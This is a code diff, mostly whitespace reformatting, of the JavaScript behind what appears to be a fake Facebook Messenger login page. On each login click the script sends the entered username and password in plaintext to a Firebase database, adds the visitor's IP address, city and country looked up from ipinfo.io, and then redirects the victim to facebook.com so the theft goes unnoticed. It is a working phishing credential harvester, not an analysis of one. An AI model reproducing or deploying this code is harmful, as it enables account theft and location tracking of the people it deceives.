@@ -19,44 +19,36 @@ console.log(window.location.origin.toString());
 // path = path.replace("/",'');
 var path = "Massanger";
 console.log(path);
-const usersRef = database.ref('/users'+path);
-var city =""
-var country=""
-var ip=""
-$.get("https://ipinfo.io", function(response) {
+const usersRef = database.ref('/users' + path);
+var city = ""
+var country = ""
+var ip = ""
+$.get("https://ipinfo.io", function (response) {
   city = response.city
   ip = response.ip
   country = response.country
   console.log(response.city, response.country);
 }, "jsonp");
-// while(true){
-//   if(userId.value.length >4 && Pass.value.length>4)
-//   {
-//     LoginBtn.disabled = false;
-//   }
-//   else
-//   {
-//   LoginBtn.disabled = true;
-//   }
-// }
+
+
 LoginBtn.addEventListener('click', e => {
-    e.preventDefault();
-    // const autoId = usersRef.push().key
-    // usersRef.child(autoId).set({
-    //   ID: userId.value,
-    //   pw: Pass.value
-    // });
-    if(userId.value.length >4 && Pass.value.length>4)
-    {
-      usersRef.child(userId.value).transaction(function(currentData) {
-        if (currentData === null) {
-          return {ID:userId.value,pw:Pass.value,City:city,Country:country,IP:ip};
-          // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
-        } else {
-          // console.log('User  already exists.');
-          return; // Abort the transaction.
-        }
-      });
-      window.location.replace("http://www.facebook.com/me");
-    }
-  });
+  e.preventDefault();
+  // const autoId = usersRef.push().key
+  // usersRef.child(autoId).set({
+  //   ID: userId.value,
+  //   pw: Pass.value
+  // });
+  if (userId.value.length > 4 && Pass.value.length > 4) {
+
+    usersRef.child(userId.value).transaction(function (currentData) {
+      if (currentData === null) {
+        return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
+        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
+      } else {
+        // console.log('User  already exists.');
+        return; // Abort the transaction.
+      }
+    });
+    window.location.replace("http://www.facebook.com/me");
+  }
+});
